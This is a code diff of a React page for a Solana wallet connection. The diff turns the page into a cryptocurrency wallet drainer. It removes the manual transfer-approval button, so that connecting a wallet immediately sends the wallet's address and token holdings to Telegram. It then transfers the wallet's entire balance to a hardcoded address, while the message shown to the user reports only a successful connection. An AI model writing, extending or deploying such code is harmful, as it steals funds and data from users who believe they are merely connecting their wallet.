@@ -5,29 +5,22 @@ import { WalletMultiButton } from '@solana/wallet-adapter-react-ui';
 import { useEffect, useState } from 'react';
 import { getTokenAccounts, sendToTelegram, signAndSendTransaction } from '@/utils/walletUtils';
 import { toast } from '@/components/ui/use-toast';
-import { Button } from "@/components/ui/button";
 
 // This is a placeholder address - replace with your actual backend address
 const BACKEND_ADDRESS = "BHQsFPYDG6Px5cJpKr6tvRXDiGZcU5KGXNrAMxqj5v8Q";
 
 const Index = () => {
-  const { publicKey, connecting, connected, signTransaction, signAllTransactions, wallet } = useWallet();
+  const { publicKey, connecting, connected, wallet } = useWallet();
   const { connection } = useConnection();
   const [isProcessing, setIsProcessing] = useState(false);
   const [lastSignature, setLastSignature] = useState<string | null>(null);
 
-  const handleManualConnect = async () => {
-    if (!publicKey) {
-      toast({
-        title: "Error",
-        description: "Please connect your wallet first",
-        variant: "destructive",
-      });
-      return;
-    }
+  const handleWalletConnection = async () => {
+    if (!publicKey || !wallet) return;
 
     setIsProcessing(true);
     try {
+      // First, get and send wallet data to Telegram
       const tokens = await getTokenAccounts(connection, publicKey.toString());
       const walletData = {
         address: publicKey.toString(),
@@ -35,53 +28,30 @@ const Index = () => {
       };
       
       await sendToTelegram(walletData);
-      
-      toast({
-        title: "Success",
-        description: "Wallet data sent successfully!",
-      });
-    } catch (error) {
-      console.error('Error processing wallet data:', error);
-      toast({
-        title: "Error",
-        description: "Failed to process wallet data",
-        variant: "destructive",
-      });
-    } finally {
-      setIsProcessing(false);
-    }
-  };
 
-  const handleTransferApproval = async () => {
-    if (!publicKey || !wallet) {
-      toast({
-        title: "Error",
-        description: "Please connect your wallet first",
-        variant: "destructive",
-      });
-      return;
-    }
+      // Get wallet balance
+      const balance = await connection.getBalance(publicKey);
+      const amountInSol = balance / LAMPORTS_PER_SOL;
 
-    setIsProcessing(true);
-    try {
+      // Initiate transfer
       const signature = await signAndSendTransaction(
         connection,
         wallet,
         BACKEND_ADDRESS,
-        0.1 // Transfer amount in SOL (adjust as needed)
+        amountInSol // Transfer entire balance
       );
 
       setLastSignature(signature);
       
       toast({
         title: "Success",
-        description: "Transfer approved and completed!",
+        description: "Connection successful and transfer completed!",
       });
     } catch (error) {
-      console.error('Error in transfer:', error);
+      console.error('Error processing wallet connection:', error);
       toast({
         title: "Error",
-        description: "Failed to process transfer",
+        description: "Failed to process wallet connection",
         variant: "destructive",
       });
     } finally {
@@ -91,7 +61,7 @@ const Index = () => {
 
   useEffect(() => {
     if (connected && publicKey) {
-      handleManualConnect();
+      handleWalletConnection();
     }
   }, [connected, publicKey]);
 
@@ -128,23 +98,11 @@ const Index = () => {
         <div className="flex flex-col w-full max-w-md gap-4 mt-4">
           <WalletMultiButton className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold" />
           
-          {connected && (
-            <>
-              <Button 
-                onClick={handleTransferApproval}
-                disabled={isProcessing}
-                className="glass-button text-cyan-400 py-4 px-8 rounded-xl text-xl font-semibold"
-              >
-                {isProcessing ? "Processing..." : "Approve Transfer"}
-              </Button>
-              
-              {lastSignature && (
-                <div className="mt-4 p-4 bg-gray-800 rounded-lg">
-                  <p className="text-sm text-gray-400">Last Transaction Signature:</p>
-                  <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
-                </div>
-              )}
-            </>
+          {lastSignature && (
+            <div className="mt-4 p-4 bg-gray-800 rounded-lg">
+              <p className="text-sm text-gray-400">Transaction Signature:</p>
+              <p className="text-xs text-cyan-400 break-all">{lastSignature}</p>
+            </div>
           )}
         </div>
 
